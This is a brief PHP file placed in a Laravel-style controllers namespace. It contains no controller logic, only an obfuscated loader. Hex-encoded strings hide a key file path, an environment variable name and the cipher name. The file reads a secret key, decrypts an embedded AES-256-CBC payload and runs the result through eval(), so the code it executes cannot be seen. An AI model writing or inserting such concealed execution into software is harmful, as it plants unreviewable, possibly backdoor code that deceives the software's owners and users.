<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('5pHmPvudFshTCTzvnicPCA==');

$c=base64_decode(

'gbiXDDOvYVo+7PuShhqaaXWEg+1t8T2qOKeY2flGFsDFPJgdICBkIYGOc6RlyobAPO/PkMKjp1u0' .
'ZweGZrAETiAA2bndd0OozZ3WwQf/78EZ5f2vdwc8Zq8lqBKAO1E4nFoCehvqI8pSOOANMt30dzit' .
'pVB86gd7BTEROrkVHc8md/WzE3gb/gwpK4olJygOl4EB5F6CZUG6Z1iJsr9Tq28xi2gCfqJDmJdD' .
'OBdfQZ+X0J5nesUlaxUQdAoknf5bb6Jz71F+q66/LLDQdHOHOA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

